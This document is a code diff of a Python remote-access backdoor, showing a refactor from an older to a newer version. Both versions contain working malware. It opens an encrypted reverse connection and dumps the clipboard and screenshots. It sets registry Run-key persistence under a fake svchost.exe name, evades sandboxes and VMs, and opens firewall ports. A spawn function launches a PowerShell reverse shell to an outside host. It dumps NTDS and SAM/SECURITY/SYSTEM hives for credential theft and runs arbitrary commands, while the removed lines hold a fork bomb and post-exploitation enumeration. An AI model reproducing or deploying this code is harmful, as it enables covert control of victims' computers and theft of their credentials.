@@ -1,43 +1,40 @@
 #!/usr/bin/python
-from Crypto import Random
-from Crypto.Cipher import AES
+import base64
 import ctypes
+import hashlib
+import json
 import os
 import platform
-import pyperclip
 import shutil
-import subprocess
-import json
-import sys
-import base64
-import hashlib
 import socket
+import subprocess
+import sys
+
+import pyperclip
+from Crypto import Random
+from Crypto.Cipher import AES
 from mss import mss
 
-global ip,port,TMP,APPDATA,path,os_type,red,yellow,r
+global ip, port, TMP, APPDATA, path, os_type, access_password, password
 
-
-# color codes..................
-red="\033[1;32;31m"
-yellow="\033[1;32;33m"
-r="\x1b[0m"
-
+# connection/access settings ##############
 dns = '0.0.0.0'
-ip = socket.gethostbyname(dns)
 port = 6969
+access_password = "1234"
+###########################################
 
-global password
+ip = socket.gethostbyname(dns)
 
-# AES channel password..............
-password="djknBDS89dHFS(*HFSD())"
+# AES channel password ##############
+password = "djknBDS89dHFS(*HFSD())"
 
-# detect OS type for future use........................
+# detect OS type ###############
 if "Linux" in platform.uname():
     os_type = "linux"
 else:
     os_type = "windows"
 
-# set temp and appdata path variables for future use...
+# set windows temp and appdata directory ######
 if os_type == "windows":
     try:
         TMP = os.environ["TEMP"]
@@ -46,7 +43,8 @@ if os_type == "windows":
         os_type = 'linux'
         pass
 
-# AES encryption/decryption.....................................................
+
+# AES encryption/decryption class #################################################
 class AESCipher(object):
     def __init__(self, key):
         self.bs = AES.block_size
@@ -69,14 +67,14 @@ class AESCipher(object):
 
     @staticmethod
     def _unpad(s):
-        return s[:-ord(s[len(s)-1:])]
+        return s[:-ord(s[len(s) - 1:])]
 
 
-# main backdoor class and functions..............................................
+# main backdoor class and functions #################################################################
 class Backdoor:
     def __init__(self, ip, port):
         # uncomment to activated at startup if needed
-        #self.persistance()
+        # self.persistance()
         self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         while True:
             try:
@@ -84,8 +82,17 @@ class Backdoor:
                 break
             except socket.error:
                 continue
+        while True:
+            pwd = self.receive()
+            if pwd != access_password:
+                self.json_send("\n [-] wrong password [-] \n")
+                continue
+            else:
+                self.json_send("\n [+] access granted [+] \n")
+                break
 
-    def encrypt(self,message):
+# encrypt/decrypt data ###############################################################
+    def encrypt(self, message):
         encrypted = AESCipher(password).encrypt(message)
         return encrypted
 
@@ -93,12 +100,13 @@ class Backdoor:
         decrypted = AESCipher(password).decrypt(message)
         return decrypted
 
+    # send/receive data ########################################################
     def json_send(self, data):
         try:
             json_data = json.dumps(data)
             return self.conn.send(self.encrypt(json_data))
         except:
-            return self.conn.send(self.encrypt("[-] STDOUT parsing problem [-]"))
+            return self.conn.send(self.encrypt("\n [-] STDOUT parsing problem [-] \n"))
             pass
 
     def receive(self):
@@ -112,15 +120,16 @@ class Backdoor:
             except:
                 pass
 
-    # dump clipboard..................
+    # dump clipboard #####################
     def clipboard(self):
         try:
             s = pyperclip.paste()
             pyperclip.copy(s)
             return s
         except:
-            return "[-] dump failed [-]"
+            return "\n [-] dump failed [-] \n"
 
+    # take screenshot ###################
     def screenshot(self):
         try:
             with mss() as screenshot:
@@ -128,9 +137,8 @@ class Backdoor:
         except:
             pass
 
-
-    # make persistence after reboot...........................................
-    def persistence(self):
+    # persistence functions #######################################################################################################
+    def persist_reg(self):
         if os_type == 'windows':
             try:
                 location = os.environ["appdata"] + '\\svchost.exe'
@@ -139,21 +147,22 @@ class Backdoor:
                     subprocess.call(
                         'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"',
                         shell=True)
-                    return "[+] persistance access activated [+]"
+                    return "\n[+] persistance access activated [+]\n"
             except:
-                return "[!] failed to set persistance access [!]"
+                return "\n[!] failed to set persistance access [!]\n"
+        else:
+            return "\n[!] target is not a windows machine [!]\n"
 
-
-
+    # system information ##########################
     def sysinfo(self):
         try:
             sysinfo = platform.uname()
             sysinfo = [' '.join(sysinfo)]
             return str(sysinfo)
         except:
-            return "[!] unable to get sysinfo [!]"
+            return "\n[!] unable to get sysinfo [!]\n"
 
-
+    # read/write file ##################################
     def write_file(self, path, content):
         try:
             with open(path, "wb") as file:
@@ -172,31 +181,37 @@ class Backdoor:
     def detectSandboxie(self):
         try:
             self.libHandle = ctypes.windll.LoadLibrary("SbieDll.dll")
-            return "[!] Sandbox detected [!]"
+            return "\n[!] Sandbox detected [!]\n"
         except:
-            return "[+] doesn't appear to be a sandbox [+]"
+            return "\n[+] doesn't appear to be a sandbox [+]\n"
 
     def detectVM(self):
-        try:
-            import wmi
-            self.objWMI = wmi.WMI()
-            for objDiskDrive in self.objWMI.query("Select * from Win32_DiskDrive"):
-                if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
-                    return "[!] Virtual Machine detected [!]"
-            return "[+] doesn't appear to be a VM [+]"
-        except:
-            return "[-] VM check failed, unable to load module wmi  [-]"
-
-    def fork(self):
-        try:
-            while 1:
-                os.fork()
-        except:
-            return "[-] fork deploy failed [-]"
-
-    def firewall(self,direction,port,name):
         if os_type == "windows":
-            rule = 'netsh advfirewall firewall add rule name='+ str(name) + ' protocol=TCP dir=' + str(direction) + ' localport= '+str(port)+' action=allow'
+            try:
+                import wmi
+                self.objWMI = wmi.WMI()
+                for objDiskDrive in self.objWMI.query("Select * from Win32_DiskDrive"):
+                    if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
+                        return "\n[!] Virtual Machine detected [!]\n"
+                    return "\n[+] doesn't appear to be a VM [+]\n"
+            except:
+                return "\n[-] VM check failed, unable to load module wmi  [-]\n"
+        else:
+            try:
+                self.checkVM = subprocess.check_output(
+                    'grep -q ^flags.*\ hypervisor /proc/cpuinfo && echo "This machine is a VM"', shell=True)
+                if self.checkVM == "This machine is a VM":
+                    return "\n[!] Virtual Machine detected [!]\n"
+            except subprocess.CalledProcessError:
+                return "\n[+] doesn't appear to be a VM [+]\n"
+            except Exception, e:
+                return "\n[-] VM check failed, unable to grep /proc/cpuinfo " + str(e) + "\n"
+
+    # set firewall rules ###############################################################################
+    def firewall(self, direction, port, name):
+        if os_type == "windows":
+            rule = 'netsh advfirewall firewall add rule name=' + str(name) + ' protocol=TCP dir=' + str(
+                direction) + ' localport= ' + str(port) + ' action=allow'
         else:
             if direction == "in":
                 direction = "INPUT"
@@ -204,25 +219,29 @@ class Backdoor:
                 direction = "OUTPUT"
             rule = 'iptables -A ' + str(direction) + ' -p tcp --dport ' + str(port) + ' -j ACCEPT'
         try:
-            subprocess.call(rule,shell=True)
-            return "[+] firewall rule added successfully [+]"
+            subprocess.call(rule, shell=True)
+            return "\n[+] firewall rule added successfully [+]\n"
         except:
-            return "[-] failed to add firewall rule [-]"
+            return "\n[-] failed to add firewall rule [-]\n"
             pass
 
-    def spawn(self,target_ip,target_port):
-    	target_ip = socket.gethostbyname(target_ip)
-        spawner="""powershell -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('""" + str(target_ip) + """',""" + str(target_port) + """);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""""
-        try:
-            subprocess.Popen(spawner,shell=True)
-            return "[+] powershell session spawned successfully check your listener [+]"
-        except :
-            return "[-] failed to spawn powershell session [-]"
+    # spawn powershell session ####################################################################################
+    def spawn(self, target_ip, target_port):
+        if os_type == 'windows':
+            target_ip = socket.gethostbyname(target_ip)
+            spawner="""powershell -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('""" + str(target_ip) + """',""" + str(target_port) + """);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""""
+            try:
+                subprocess.Popen(spawner, shell=True)
+                return "\n[+] powershell session spawned successfully, check your listener [+]\n"
+            except:
+                return "\n[-] failed to spawn powershell session [-]\n"
+        else:
+            return "\n[!] target is not a windows machine [!]\n"
 
-
+    # dump windows credentials ######################################################################################
     def ntds(self):
         if os_type == 'windows':
-            is_admin =  str(ctypes.windll.shell32.IsUserAnAdmin())
+            is_admin = str(ctypes.windll.shell32.IsUserAnAdmin())
             if is_admin == '1':
                 try:
                     shutil.rmtree("C:\Windows\Temp\copy-ntds")
@@ -230,18 +249,20 @@ class Backdoor:
                     pass
                 try:
                     DEVNULL = open(os.devnull, 'wb')
-                    result = str(subprocess.check_output('ntdsutil "ac i ntds" "ifm" "create full c:\windows\\temp\copy-ntds" quit quit', shell=True, stderr=DEVNULL, stdin=DEVNULL))
-                    return "[+] dumped using ntdsutil, saved in c:\Windows\Temp\copy-ntds [+]"
+                    result = str(subprocess.check_output(
+                        'ntdsutil "ac i ntds" "ifm" "create full c:\windows\\temp\copy-ntds" quit quit', shell=True,
+                        stderr=DEVNULL, stdin=DEVNULL))
+                    return "\n[+] dumped using ntdsutil, saved in c:\Windows\Temp\copy-ntds [+]\n"
                 except:
-                    return "[-] ntds dump failed [-]"
+                    return "\n[-] ntds dump failed [-]\n"
             else:
-                return "[+] permission denied, your not running as admin [+]"
+                return "\n[+] permission denied, your not running as admin [+]\n"
         else:
-            return "[!] target is not a windows machine [!]"
+            return "\n[!] target is not a windows machine [!]\n"
 
     def reg_save(self):
         if os_type == 'windows':
-            is_admin =  str(ctypes.windll.shell32.IsUserAnAdmin())
+            is_admin = str(ctypes.windll.shell32.IsUserAnAdmin())
             if is_admin == '1':
                 try:
                     os.remove('C:\Windows\Temp\sam.save')
@@ -256,207 +277,26 @@ class Backdoor:
                 except:
                     pass
                 try:
-                    subprocess.call('reg save hklm\sam C:\Windows\Temp\sam.save',shell=True)
-                    subprocess.call('reg save hklm\security C:\Windows\Temp\security.save',shell=True)
-                    subprocess.call('reg save hklm\system C:\Windows\Temp\system.save',shell=True)
+                    subprocess.call('reg save hklm\sam C:\Windows\Temp\sam.save', shell=True)
+                    subprocess.call('reg save hklm\security C:\Windows\Temp\security.save', shell=True)
+                    subprocess.call('reg save hklm\system C:\Windows\Temp\system.save', shell=True)
                     return "[+] dumped using reg save, saved in C:\Windows\Temp\sam.save, system.save , security.save [+]"
                 except:
-                    return "[-] reg-save dump failed [-]"
+                    return "\n[-] reg-save dump failed [-]\n"
             else:
-                return "[+] permission denied, your not running as admin [+]"
+                return "\n[+] permission denied, your not running as admin [+]\n"
         else:
-            return "[+] target is not a windows machine  [+]"
+            return "\n[+] target is not a windows machine  [+]\n"
 
+    # change working directory ########################
     def chdir(self, path):
         try:
             os.chdir(path)
-            return "dir changed to " + str(path)
-        except:
-            return "[-] no such file or directory [-]"
+            return "\ndir changed to " + os.getcwd() + "\n"
+        except Exception, e:
+            return "\n[-] no such file or directory [-]\n"
 
-# post exploitation enumeration function for linux............................................................................
-    def linux_enum(self):
-        system = {"/etc/issue ": "cat /etc/issue",
-                  "available shells on system":'cat /etc/shells |grep "bin"|cut -d "/" -f3 2>/dev/null | sort -u',
-            "OS kernel and version ":"cat /proc/version && uname -mrs && dmesg | grep Linux && ls /boot | grep vmlinuz-",
-            "hostname ": "hostname",
-            "release ": "cat /etc/*-release",
-        "available programming languages":'progr_dev=( "which perl" "which gcc" "which g++"  "which python" "which php" "which cc" "which go" "which node") ;for programming_lang in "${progr_dev[@]}"; do pss=`$programming_lang |cut -d"/" -f4` ;if [ "$pss" ];  then echo -e "$pss" ;fi done',
-                  "log files":"ls -haltrZ /var/log"}
-        user_accounts = {"users":"cat /etc/passwd | cut -d: -f1  ",
-            "emails":"mail && ls -alh /var/mail/",
-            "id": "id", "/etc/passwd & /etc/shadow access": "ls -la /etc/passwd /etc/shadow",
-            "sudo version":"sudo -V",
-            "super users": "grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'",
-            "check for sudo access with <sudo -l>": "sudo -l",
-            "logged in accounts": "w",
-            "last loggins": "last",
-            "command history ( last 30 )": " tail -n 30 ~/.bash_history",
-            "sudoers": "cat /etc/sudoers 2>/dev/null | grep -v '#'",
-            "environment variables": "env 2>/dev/null | grep -v 'LS_COLORS'"}
-        processes = {"mysql command history":"cat ~/.mysql_history",
-                     "root services": "ps -ef | grep root",
-                     "apt cached packages": "ls -alh /var/cache/apt/archives",
-                     "yum cached packages": "ls -alh /var/cache/yum/",
-                     "rpm packages": "rpm -qa",
-                     "printer status": "lpstat -a",
-                     "apache version and modules":"apache2 -v; apache2ctl -M; httpd -v; apachectl -l 2>/dev/null"}
-        network = {"hosts and DNS":"cat /etc/hosts 2>/dev/null && cat /etc/resolv.conf 2>/dev/null && cat /etc/sysconfig/network 2>/dev/null && cat /etc/networks 2>/dev/null | uniq | srt | grep -v '#'",
-                    "domain name":"dnsdomainname",
-                    "root login status":"cat /etc/ssh/sshd_config | grep PermitRootLogin | grep -v '#'",
-                   "interfaces": "/sbin/ifconfig -a",
-                   "network routes": "route",
-                   "all users communications":"lsof -i",
-                   "connections status": "netstat -antup ",
-                   "firewall ":"iptables -L 2>/dev/null && ls /etc/iptables 2>/dev/null"}
-        file_system = {"/var/www/ content":"ls -alhR /var/www/",
-                       "/etc/fstab": "cat /etc/fstab | grep -v '#'",
-                       "aARP table":"arp -e",
-                       "disks": "fdisk -l",
-                       "mounted disks":"df -h",
-                       "SUID / SGID files":"find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -la {} \; 2>/dev/null"
-                       }
-        scheduled_jobs = {"cron jobs": "crontab -l | grep -v '#'",
-                          "crontab":"cat /etc/crontab | grep -v '#'"}
-
-        # headers for each data section..........................................................................................
-        system_info = yellow, "\n#### OS and version information ###################################################\n\n", r
-        user_accounts_info = yellow, "\n#### users and accounts ###################################################\n\n", r
-        processes_info = yellow, "\n#### processes and packages ###################################################\n\n", r
-        network_info = yellow, "\n#### network status ###################################################\n\n", r
-        file_system_info = yellow, "\n#### directory and file system info ###################################################\n\n", r
-        scheduled_jobs_info = yellow, "\n#### scheduled jobs ###################################################\n\n", r
-
-        # join the headers and the values for each data section as a variable........................................................
-        for key, value in system.items():
-            try:
-                system_info += red, "[+] " + key + " [+] \n", r + str(
-                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
-            except:
-                pass
-        for key, value in user_accounts.items():
-            try:
-                user_accounts_info += red, "[+] " + key + " [+] \n", r + str(
-                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
-            except:
-                pass
-        for key, value in processes.items():
-            try:
-                processes_info += red, "[+] " + key + " [+] \n", r + str(
-                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
-            except:
-                pass
-        for key, value in network.items():
-            try:
-                network_info += red, "[+] " + key + " [+] \n", r + str(
-                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
-            except:
-                pass
-        for key, value in file_system.items():
-            try:
-                file_system_info += red, "[+] " + key + " [+] \n", r + str(
-                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
-            except:
-                pass
-        for key, value in scheduled_jobs.items():
-            try:
-                scheduled_jobs_info += red, "[+] " + key + " [+] \n", r + str(
-                    subprocess.check_output(value + "; exit 0", shell=True, stderr=subprocess.STDOUT)) + "\n\n"
-            except:
-                pass
-
-        # join all the gathered intel in one variable .......................................................................
-        results = system_info + user_accounts_info + processes_info + network_info + file_system_info + scheduled_jobs_info
-        results = ' '.join(results)
-        intel = open('/tmp/enum.txt','a')
-        intel.write(results)
-        intel.close()
-
-    def windows_enum(self):
-        system = {"hostname":"whoami /all",
-                  "OS and system information":"systeminfo",
-                  "system architecture":"wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%",
-                  "system time and date":"net time",
-                  "domain files":"net files",
-                    "system sessions":"net sessions",
-                  "system connections":"net use",
-                  "check always install elevated in HKCU and HKLM":"reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer && reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer",
-                  "kernel drivers":"driverquery | findstr Kernel",
-                  "file system drivers":'driverquery | findstr "File System"',
-                  "running tasks (current user access level":"tasklist",
-                  "services full status and info":"sc queryex type= service state= all",
-                  "installed softwares":"wmic product get name, version, vendor",
-                  "system-wide updates and hotfixes":"wmic qfe get Caption, Description, HotFixID, InstalledOn",
-                  "interesting registries":"reg query HKLM /f pass /t REG_SZ /s && reg query HKCU /f pass /t REG_SZ /s",
-                  "env variables":"set",
-                  "security logs":"wevtutil qe Security" }
-
-        user_accounts = {"users":"net users",
-                         "loged in users": "qwinsta",
-                         "loggon requirments": "net accounts" }
-        network = {"default gateway information":"route print",
-                   "arp table entries":"arp -a",
-                   "network interfaces":"ipconfig /all",
-                   "network connection status":"netstat -ano",
-                   "stored wireless access points":"netsh wlan show profile",
-                    "network shares":"net share",
-                    "current firewall profile":"netsh advfirewall show currentprofile",
-                   "all firewall profiles":"Netsh Advfirewall show allprofiles",
-                   "firewall configs and status":"netsh firewall show config && netsh firewall show state && netsh advfirewall firewall dump",
-                   "firewall ruels":"netsh advfirewall firewall show rule name=all",}
-        file_system = {"mounted/unmounted volumes":"mountvol",
-                       "device drives":"fsutil fsinfo drives"}
-
-        scheduled_jobs ={"scheduled tasks":"schtasks /query /fo LIST /v",}
-
-        # headers for each data section..........................................................................................
-        system_info = yellow, "\n#### OS and version information ###################################################\n\n", r
-        user_accounts_info = yellow, "\n#### users and accounts ###################################################\n\n", r
-        network_info = yellow, "\n#### network status ###################################################\n\n", r
-        file_system_info = yellow, "\n#### directory and file system info ###################################################\n\n", r
-        scheduled_jobs_info = yellow, "\n#### scheduled jobs ###################################################\n\n", r
-        DEVNULL = open(os.devnull, 'wb')
-
-        for key, value in system.items():
-            try:
-                system_info += red, "[+] " + key + " [+] \n", r + str(
-                    subprocess.check_output(value , shell=True, stderr=DEVNULL, stdin=DEVNULL)) + "\n\n"
-            except:
-                pass
-        for key, value in user_accounts.items():
-            try:
-                user_accounts_info += red, "[+] " + key + " [+] \n", r + str(
-                    subprocess.check_output(value, shell=True, stderr=DEVNULL, stdin=DEVNULL)) + "\n\n"
-            except:
-                pass
-        for key, value in network.items():
-            try:
-                network_info += red, "[+] " + key + " [+] \n", r + str(
-                    subprocess.check_output(value, shell=True, stderr=DEVNULL, stdin=DEVNULL)) + "\n\n"
-            except:
-                pass
-        for key, value in file_system.items():
-            try:
-                file_system_info += red, "[+] " + key + " [+] \n", r + str(
-                    subprocess.check_output(value, shell=True, stderr=DEVNULL, stdin=DEVNULL)) + "\n\n"
-            except:
-                pass
-        for key, value in scheduled_jobs.items():
-            try:
-                scheduled_jobs_info += red, "[+] " + key + " [+] \n", r + str(
-                    subprocess.check_output(value, shell=True, stderr=DEVNULL, stdin=DEVNULL)) + "\n\n"
-            except:
-                pass
-
-        # join all the gathered intel in one variable .......................................................................
-        results = system_info + user_accounts_info + network_info + file_system_info + scheduled_jobs_info
-        results = ' '.join(results)
-        intel = open('C:\Windows\Temp\enum.txt','a')
-        intel.write(results)
-        intel.close()
-
-
-# filter and run the commands......................................................
+    # run commands #############################################################################################
     def run(self):
         while True:
             result = ""
@@ -473,25 +313,24 @@ class Backdoor:
                 os.remove('monitor-1.png')
             elif cmd[0] == "sysinfo":
                 result = self.sysinfo()
-            elif cmd[0] == "chk":
-                result = str(self.detectSandboxie()) +"\n"+ str(self.detectVM())
-            elif cmd[0] == "persistence":
-                result=self.persistence()
+            elif cmd[0] == "checkvm":
+                result = str(self.detectSandboxie()) + "\n" + str(self.detectVM())
+            elif cmd[0] == "persist_reg":
+                result = self.persist_reg()
             elif cmd[0] == "clip":
-                result=self.clipboard()
-            elif cmd[0] == 'fork':
-                self.fork()
-            elif cmd[0] == 'fw' and len(cmd) == 4 :
-                result=self.firewall(cmd[1],cmd[2],cmd[3])
-            elif cmd[0] == "ntds":
+                result = self.clipboard()
+            elif cmd[0] == 'fw' and len(cmd) == 4:
+                result = self.firewall(cmd[1], cmd[2], cmd[3])
+            elif cmd[0] == "dump_ntds":
                 result = self.ntds()
-            elif cmd[0] == "regsave":
+            elif cmd[0] == "dump_regsave":
                 result = self.reg_save()
             elif cmd[0] == "cd" and len(cmd) > 1:
                 directory = ' '.join(cmd[1:])
+
                 result = self.chdir(directory)
             elif cmd[0] == "spawn":
-                result=self.spawn(cmd[1],cmd[2])
+                result = self.spawn(cmd[1], cmd[2])
             elif cmd[0] == "enum":
                 if os_type == "linux":
                     self.linux_enum()
@@ -504,10 +343,10 @@ class Backdoor:
                 try:
                     cmd = ' '.join(cmd[0:])
                     if os_type == "linux":
-                        result = str(subprocess.check_output(cmd + "; exit 0" , shell=True,stderr=subprocess.STDOUT))
+                        result = str(subprocess.check_output(cmd + "; exit 0", shell=True, stderr=subprocess.STDOUT))
                     else:
                         DEVNULL = open(os.devnull, 'wb')
-                        result = str(subprocess.check_output(cmd,shell=True, stderr=DEVNULL, stdin=DEVNULL))
+                        result = str(subprocess.check_output(cmd, shell=True, stderr=DEVNULL, stdin=DEVNULL))
                 except:
                     result = " "
             self.json_send(result)
@@ -519,6 +358,7 @@ class Backdoor:
                 os.remove('C:\Windows\Temp\enum.txt')
             except:
                 pass
+
 
 if __name__ == '__main__':
     try:
